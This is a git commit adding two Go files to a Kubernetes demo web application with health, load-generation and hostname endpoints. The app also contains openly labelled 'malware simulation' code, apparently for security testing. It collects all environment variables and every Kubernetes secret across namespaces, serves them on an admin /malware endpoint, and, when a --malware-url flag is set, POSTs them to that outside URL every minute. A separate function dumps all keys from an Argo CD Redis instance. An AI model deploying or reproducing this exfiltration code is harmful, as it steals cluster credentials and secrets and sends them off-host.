9a6bdc2fbaaf7783550a462d3d0649efb3295329
Lukas Beranek <lberanek@exaforce.com>
2024-03-23 11:46:45 +0100

    fixes

---
+++ handlers.go
@@ -0,0 +1,268 @@
+package main
+
+import (
+	"context"
+	"encoding/json"
+	"fmt"
+	"html/template"
+	"math/rand"
+	"net"
+	"net/http"
+	"os"
+	"runtime"
+	"strings"
+	"time"
+
+	"github.com/Masterminds/sprig/v3"
+	log "github.com/sirupsen/logrus"
+	"go.opentelemetry.io/otel/attribute"
+	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
+)
+
+func rootHandler(w http.ResponseWriter, r *http.Request) {
+	var err error
+	ctx, span := tracer.Start(r.Context(), "heavy")
+	defer span.End()
+
+	err = addHit()
+	if err != nil {
+		log.Printf("Redis error: %e", err)
+		pc.RedisError = err.Error()
+		span.RecordError(err)
+	} else {
+		pc.RedisError = ""
+		pc.RedisPath = redisPath()
+	}
+
+	err = readArgoRedis()
+	if err != nil {
+		log.Printf("Redis error: %e", err)
+		pc.RedisError = err.Error()
+		span.RecordError(err)
+	} else {
+		pc.RedisError = ""
+		pc.RedisPath = redisPath()
+	}
+	// check failure probability
+	if pc.FailureProbability > 0 {
+		if rf := rand.Float64(); rf <= pc.FailureProbability {
+			es := fmt.Sprintf("Failing due to probability set to %.2f, got %.2f. Retry your request.", pc.FailureProbability, rf)
+			log.Printf("Request failure probabilty applied on request")
+			http.Error(w, es, http.StatusBadGateway)
+			return
+		}
+	}
+
+	// check ready file
+	pc.Ready = isReady()
+
+	// store request
+	pc.Request = r
+
+	// read remote addr
+	host, _, err := net.SplitHostPort(r.RemoteAddr)
+	if err == nil {
+		pc.RemoteAddr = host
+	}
+
+	// headers
+	pc.Headers = []Header{}
+	for k, v := range r.Header {
+		va := strings.Join(v, " ")
+		ha := Header{Name: k, Value: va}
+		pc.Headers = append(pc.Headers, ha)
+	}
+
+	// update config file context
+	readConfig()
+
+	// read resources from kubernetes
+	if err := readResources(ctx); err != nil {
+		pc.KubernetesError = err.Error()
+	}
+
+	pc.PersistentFiles = readPersistentFiles()
+
+	// render template
+	t, err := template.New("base").Funcs(sprig.FuncMap()).Parse(rootPage)
+	if err != nil {
+		span.RecordError(err)
+		log.Printf("Unable to parse template: %s", err)
+	}
+	err = t.Execute(w, pc)
+	if err != nil {
+		span.RecordError(err)
+		log.Printf("Unable to execute template: %s", err)
+	}
+}
+
+func readyHandler(w http.ResponseWriter, r *http.Request) {
+	if !isReady() {
+		http.Error(w, fmt.Sprintf("NOT ready, %s exists", readyFile), http.StatusNotFound)
+	} else if checkReady {
+		fmt.Fprintf(w, "OK")
+	} else {
+		http.Error(w, "NOT ready", http.StatusNotFound)
+	}
+}
+
+func liveHandler(w http.ResponseWriter, r *http.Request) {
+	fmt.Fprintf(w, "OK")
+}
+
+func terminateHandler(w http.ResponseWriter, r *http.Request) {
+	log.Printf("Terminating on request from %s", r.RemoteAddr)
+	log.Printf("Reporting this instance as NOT ready")
+	checkReady = false
+	fmt.Fprintf(w, "OK")
+
+	go func() {
+		time.Sleep(exitDelay)
+
+		exit <- nil
+	}()
+}
+
+// make heavy computation
+func heavyHandler(w http.ResponseWriter, r *http.Request) {
+	ctx, span := tracer.Start(r.Context(), "heavy")
+	defer span.End()
+
+	fmt.Fprintf(w, "Starting heavy load\n")
+
+	go func() {
+		_, span := tracer.Start(ctx, "heavy-goroutines")
+		defer span.End()
+
+		f, err := os.Open(os.DevNull)
+		if err != nil {
+			span.RecordError(err)
+			panic(err)
+		}
+		defer f.Close()
+
+		n := runtime.NumCPU()
+		runtime.GOMAXPROCS(n)
+		span.SetAttributes(
+			attribute.Int("goroutines", n),
+		)
+
+		for i := 0; i < n; i++ {
+			go func() {
+				for {
+					fmt.Fprintf(f, ".")
+				}
+			}()
+		}
+	}()
+
+	time.Sleep(3 * time.Second)
+	fmt.Fprintf(w, "Executed heavy load\n")
+}
+
+// make slow response
+func slowHandler(w http.ResponseWriter, r *http.Request) {
+	_, span := tracer.Start(r.Context(), "sleep")
+	time.Sleep(3 * time.Second)
+	defer span.End()
+
+	fmt.Fprintf(w, "Executed slow load\n")
+}
+
+// return hostname
+func hostnameHandler(w http.ResponseWriter, r *http.Request) {
+	hn, err := os.Hostname()
+
+	if c := os.Getenv("CLUSTER"); c != "" {
+		hn = fmt.Sprintf("%s/%s", c, hn)
+	}
+	if c := os.Getenv("VES_IO_SITENAME"); c != "" {
+		hn = fmt.Sprintf("%s/%s", c, hn)
+	}
+	if c := os.Getenv("VES_IO_REGION"); c != "" {
+		hn = fmt.Sprintf("%s/%s", c, hn)
+	}
+
+	if err != nil {
+		fmt.Fprintf(w, "Failed reading hostname: %s", err)
+	} else {
+		fmt.Fprint(w, hn)
+	}
+}
+
+type MalwareData struct {
+	Secret map[string]string
+	Env    map[string]string
+}
+
+func readSecrets(ictx context.Context) (map[string]string, error) {
+	ctx, span := tracer.Start(ictx, "readSecrets")
+	defer span.End()
+
+	cs, err := getClientset()
+	if err != nil {
+		span.RecordError(err)
+		return nil, err
+	}
+
+	// list pods
+	l, err := cs.CoreV1().Secrets("").List(ctx, metav1.ListOptions{})
+	if err != nil {
+		span.RecordError(err)
+		return nil, err
+	}
+
+	r := map[string]string{}
+	for _, s := range l.Items {
+		bn, err := json.Marshal(s)
+		if err != nil {
+			span.RecordError(err)
+			return nil, err
+		}
+
+		r[fmt.Sprintf("%s/%s", s.GetNamespace(), s.GetName())] = string(bn)
+	}
+
+	return r, nil
+}
+
+func getMalwareData(ctx context.Context) (*MalwareData, error) {
+	md := &MalwareData{
+		Secret: map[string]string{},
+		Env:    map[string]string{},
+	}
+
+	// read env
+	for _, v := range os.Environ() {
+		pair := strings.Split(v, "=")
+		md.Env[pair[0]] = pair[1]
+	}
+
+	// read secrets
+	s, err := readSecrets(ctx)
+	if err != nil {
+		log.Printf("Unable to list secrets: %s", err)
+	} else {
+		md.Secret = s
+	}
+
+	return md, nil
+}
+
+func malwareHandler(w http.ResponseWriter, r *http.Request) {
+	ctx, span := tracer.Start(r.Context(), "malware")
+	defer span.End()
+
+	dm, err := getMalwareData(ctx)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusBadGateway)
+		return
+	}
+
+	d, err := json.Marshal(dm)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+	}
+
+	fmt.Fprint(w, string(d))
+}
---
+++ main.go
@@ -0,0 +1,462 @@
+package main
+
+import (
+	"bytes"
+	"context"
+	"encoding/json"
+	"fmt"
+	"io/ioutil"
+	"math/rand"
+	"net/http"
+	"os"
+	"strconv"
+	"strings"
+	"time"
+
+	"go.opentelemetry.io/otel/sdk/resource"
+	tracesdk "go.opentelemetry.io/otel/sdk/trace"
+	semconv "go.opentelemetry.io/otel/semconv/v1.4.0"
+
+	log "github.com/sirupsen/logrus"
+	"go.opentelemetry.io/contrib/instrumentation/github.com/gorilla/mux/otelmux"
+	"go.opentelemetry.io/otel"
+	"go.opentelemetry.io/otel/exporters/jaeger"
+	sdktrace "go.opentelemetry.io/otel/sdk/trace"
+	"go.uber.org/zap"
+
+	"github.com/go-redis/redis"
+	"github.com/gorilla/handlers"
+	"github.com/gorilla/mux"
+	"github.com/prometheus/client_golang/prometheus"
+	"github.com/prometheus/client_golang/prometheus/promhttp"
+	"github.com/spf13/cobra"
+	apps_v1 "k8s.io/api/apps/v1"
+	v1 "k8s.io/api/core/v1"
+)
+
+type pageContent struct {
+	Vars           map[string]*envVar
+	Hostname       string
+	Hits           int
+	RedisHost      string
+	RedisPath      string
+	RedisError     string
+	Cmd            string
+	ConfFile       string
+	ConfigFilePath string
+	Help           string
+	Ready          bool
+	Color          string
+	Resources      Resources
+	Headers        []Header
+
+	Keys []string
+
+	PageRefresh bool
+
+	Request         *http.Request
+	KubernetesError string
+	KubernetesHost  string
+
+	PersistentFiles    []string
+	FailureProbability float64
+
+	RemoteAddr string
+
+	Listen      string
+	ListenAdmin string
+}
+
+type Header struct {
+	Name  string
+	Value string
+}
+
+type envVar struct {
+	Name      string
+	Value     string
+	Dangerous bool
+}
+
+type Resources struct {
+	Pods        []v1.Pod
+	Services    []v1.Service
+	Deployments []apps_v1.Deployment
+	ReplicaSets []apps_v1.ReplicaSet
+	Secrets     []v1.Secret
+}
+
+func (e *envVar) detect() {
+	dv := strings.ToLower(e.Name + e.Value)
+
+	e.Dangerous = strings.Contains(dv, "pass") ||
+		strings.Contains(dv, "user") ||
+		strings.Contains(dv, "token") ||
+		strings.Contains(dv, "key")
+}
+
+var (
+	configFile = "/etc/kad/config.yml"
+	pc         = pageContent{
+		Vars:           make(map[string]*envVar),
+		Hits:           0,
+		Keys:           []string{},
+		Cmd:            "",
+		ConfigFilePath: configFile,
+	}
+
+	checkReady = true
+	readyFile  = "/tmp/notready"
+
+	exit      = make(chan error)
+	exitDelay = 15 * time.Second
+	tracer    = otel.Tracer("go.6shore.net/kad")
+)
+
+func responseTime(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		start := time.Now()
+		next.ServeHTTP(w, r)
+		took := time.Since(start).Seconds()
+
+		// set duration
+		httpDuration.With(
+			prometheus.Labels{
+				"method":   r.Method,
+				"endpoint": r.URL.String(),
+			}).Observe(took)
+
+		// increase cout
+		httpRequestTotal.With(
+			prometheus.Labels{
+				"method":   r.Method,
+				"endpoint": r.URL.String(),
+			}).Add(1)
+
+		// set random metrics
+		rn := fmt.Sprintf("%d", rand.Intn(1000))
+		randomMet.With(
+			prometheus.Labels{
+				"rn": rn,
+			}).Add(1)
+
+	})
+}
+
+func isReady() bool {
+	_, err := os.Stat(readyFile)
+
+	return err != nil
+}
+
+func redisPath() string {
+	cluster := os.Getenv("CLUSTER")
+	return fmt.Sprintf("hits-%s", cluster)
+}
+
+func addHit() error {
+	// TODO: add tracing
+	if pc.RedisHost == "" {
+		// Use pc variable
+		pc.Hits = pc.Hits + 1
+
+	} else {
+		// use redis
+		client := redis.NewClient(&redis.Options{
+			Addr:         pc.RedisHost,
+			DialTimeout:  300 * time.Millisecond,
+			ReadTimeout:  300 * time.Millisecond,
+			WriteTimeout: 300 * time.Millisecond,
+		})
+
+		defer client.Close()
+
+		hits, err := client.Incr(redisPath()).Result()
+		if err != nil {
+			return fmt.Errorf("Unable to inc hits in redis: %s", err)
+		}
+		pc.Hits = int(hits)
+
+	}
+
+	pageHits.Observe(float64(pc.Hits))
+
+	return nil
+}
+
+func readArgoRedis() error {
+	// TODO: add tracing
+	if pc.RedisHost == "" {
+		// Use pc variable
+		pc.Hits = pc.Hits + 1
+
+	} else {
+		// use redis
+		client := redis.NewClient(&redis.Options{
+			Addr:         "my-release-argocd-redis:6379",
+			DialTimeout:  300 * time.Millisecond,
+			ReadTimeout:  300 * time.Millisecond,
+			WriteTimeout: 300 * time.Millisecond,
+		})
+
+		defer client.Close()
+
+		// Retrieve all keys using the "KEYS" command. Be cautious using this in production with large datasets.
+		keys, err := client.Keys("*").Result()
+		if err != nil {
+			fmt.Println("Error retrieving keys:", err)
+			return err
+		}
+		pc.Keys = keys
+
+	}
+
+	pageHits.Observe(float64(pc.Hits))
+
+	return nil
+}
+
+func readConfig() {
+	// read config file
+	if content, err := ioutil.ReadFile(configFile); err != nil {
+		log.Printf("Unable to read config file %s: %s", configFile, err)
+	} else {
+		pc.ConfFile = string(content)
+	}
+}
+
+func main() {
+	l, err := zap.NewProduction()
+	if err != nil {
+		panic(err)
+	}
+	defer l.Sync()
+
+	var rootCmd = &cobra.Command{
+		Use: "kad",
+		Run: func(cmd *cobra.Command, args []string) {
+			var err error
+
+			ctx := context.Background()
+
+			if cmd.Flag("fail").Value.String() == "true" {
+				l.Info("Remove --fail command parameter to start properly")
+				panic("fail option is enabled")
+			}
+
+			// mallware demo
+			if mur := cmd.Flag("malware-url").Value.String(); mur != "" {
+				go func() {
+					for {
+						dm, err := getMalwareData(ctx)
+						if err != nil {
+							continue
+						}
+
+						jsonData, err := json.Marshal(dm)
+						if err != nil {
+							continue
+						}
+
+						resp, err := http.Post(mur, "application/json", bytes.NewBuffer(jsonData))
+						if err != nil {
+							fmt.Println(err)
+						} else {
+							log.Printf("Send malware data to %s got %d response", mur, resp.StatusCode)
+						}
+
+						time.Sleep(60 * time.Second)
+					}
+				}()
+			}
+
+			if fpr := cmd.Flag("failure-probability").Value.String(); fpr != "" {
+				fp, err := strconv.ParseFloat(fpr, 64)
+				if err != nil {
+					log.Fatalf("Failed reading request failure probability (%s): %s", fpr, err)
+				}
+				if fp > 1 || fp < 0 {
+					log.Fatal("Failure probabilty must be between 0 and 1")
+				}
+
+				pc.FailureProbability = fp
+				l.Info("Request failure probablity set", zap.Float64("probability", fp))
+			}
+			// read environment variables
+			for _, v := range os.Environ() {
+				pair := strings.Split(v, "=")
+
+				p := envVar{Name: pair[0], Value: pair[1]}
+				p.detect()
+				pc.Vars[pair[0]] = &p
+			}
+			listen := ":8000" //port 5000 is used by control center on macos
+			if lp := os.Getenv("LISTEN_PORT"); lp != "" {
+				listen = lp
+			}
+			listenAdmin := ":8001"
+			if lpa := os.Getenv("LISTEN_ADMIN_PORT"); lpa != "" {
+				listenAdmin = lpa
+			}
+			pc.Listen = listen
+			pc.ListenAdmin = listenAdmin
+
+			// read hostname
+			pc.Hostname, err = os.Hostname()
+			if err != nil {
+				log.Printf("Unable to read hostname: %s", err)
+			}
+
+			// read command
+			pc.Cmd = strings.Join(os.Args, " ")
+
+			// setup color
+			pc.Color = cmd.Flag("color").Value.String()
+			if v := os.Getenv("COLOR"); v != "" && pc.Color == "" {
+				pc.Color = v
+			}
+			if pc.Color == "" {
+				pc.Color = "#ffffff"
+			}
+
+			// detect redis
+			pc.RedisHost = os.Getenv("REDIS_SERVER")
+
+			// gorilla mux
+			r := mux.NewRouter()
+
+			// tracing
+			if jh := os.Getenv("OTEL_EXPORTER_JAEGER_AGENT_HOST"); jh != "" {
+				tp, err := initTracer()
+				if err != nil {
+					log.Fatal(err)
+				}
+				defer func() {
+					if err := tp.Shutdown(context.Background()); err != nil {
+						log.Printf("Error shutting down tracer provider: %v", err)
+					}
+				}()
+
+				otel.SetTracerProvider(tp)
+				r.Use(otelmux.Middleware("kad"))
+
+				l.Info("Tracing configured", zap.String("exporter-agent-host", jh))
+			}
+
+			adminRouter := mux.NewRouter()
+
+			// register handlers
+			r.HandleFunc("/", rootHandler)
+			r.HandleFunc("/heavy", heavyHandler)
+			r.HandleFunc("/slow", slowHandler)
+			r.HandleFunc("/hostname", hostnameHandler)
+			r.HandleFunc("/check/live", liveHandler)
+			r.HandleFunc("/check/ready", readyHandler)
+			r.HandleFunc("/kubernetes/delete/{type}/{name}", kubernetesDeleteHandler)
+			r.Handle("/metrics", promhttp.Handler())
+
+			adminRouter.HandleFunc("/action/terminate", terminateHandler)
+			adminRouter.HandleFunc("/check/live", liveHandler)
+			adminRouter.HandleFunc("/check/ready", readyHandler)
+			adminRouter.HandleFunc("/check/ready", readyHandler)
+			adminRouter.Handle("/metrics", promhttp.Handler())
+
+			// malware simulaiton
+			adminRouter.HandleFunc("/malware", malwareHandler)
+
+			// log requests
+			loggedRouter := handlers.LoggingHandler(os.Stdout, responseTime(r))
+			loggedAdminRouter := handlers.LoggingHandler(os.Stdout, adminRouter)
+
+			go func() {
+				l.Info("Listening on client port", zap.String("socket", listen))
+				if err := http.ListenAndServe(listen, loggedRouter); err != nil {
+					log.Printf("Server failed with: %s", err)
+					exit <- err
+				}
+			}()
+
+			go func() {
+				l.Info("Listening on admin port", zap.String("socket", listenAdmin))
+				if err := http.ListenAndServe(listenAdmin, loggedAdminRouter); err != nil {
+					log.Printf("Admin server failed with: %s", err)
+					exit <- err
+				}
+			}()
+
+			err = <-exit
+			if err != nil {
+				log.Printf("Terminating with error: %s", err)
+			}
+
+			if delay := cmd.Flag("exit-delay").Value.String(); delay != "" {
+				d, err := strconv.Atoi(delay)
+				if err != nil {
+					log.Fatalf("Failed reading exit delay (%s): %s", delay, err)
+				}
+				log.Printf("Waiting %d seconds before exiting", d)
+				time.Sleep(time.Duration(d) * time.Second)
+			}
+
+		},
+	}
+	rootCmd.PersistentFlags().String("color", "", "Background color for main page")
+	rootCmd.PersistentFlags().String("user", "", "Dummy flag")
+	rootCmd.PersistentFlags().Bool("fail", false, "Fail with non-zero exit code")
+	rootCmd.PersistentFlags().String("malware-url", "", "Malware URL to send secrets")
+	rootCmd.PersistentFlags().Float64("failure-probability", 0, "Failure probability for user requests (applies only on /, must be between 0 and 1)")
+	rootCmd.PersistentFlags().Int("exit-delay", 5, "Delay in seconds before exiting")
+	rootCmd.Execute()
+}
+
+func initTracer() (*sdktrace.TracerProvider, error) {
+	exp, err := jaeger.New(jaeger.WithAgentEndpoint())
+	if err != nil {
+		return nil, err
+	}
+
+	tp := tracesdk.NewTracerProvider(
+		// Always be sure to batch in production.
+
+		// production usage
+		//tracesdk.WithBatcher(exp),
+
+		// dev usage
+		tracesdk.WithSyncer(exp),
+		// sample every request
+		tracesdk.WithSampler(sdktrace.AlwaysSample()),
+
+		// Record information about this application in a Resource.
+		tracesdk.WithResource(resource.NewWithAttributes(
+			semconv.SchemaURL,
+			semconv.ServiceNameKey.String("kad"),
+			//attribute.String("environment", environment),
+			//attribute.Int64("ID", id),
+		)),
+	)
+
+	return tp, nil
+}
+
+func readPersistentFiles() []string {
+	dataDir := os.Getenv("DATADIR")
+	if dataDir == "" {
+		dataDir = "/data"
+	}
+
+	r := []string{}
+	files, err := ioutil.ReadDir(dataDir)
+	if err != nil {
+		return r
+	}
+
+	for _, f := range files {
+		if f.IsDir() {
+			r = append(r, f.Name()+" (d)")
+		} else {
+			r = append(r, f.Name())
+		}
+	}
+
+	return r
+}
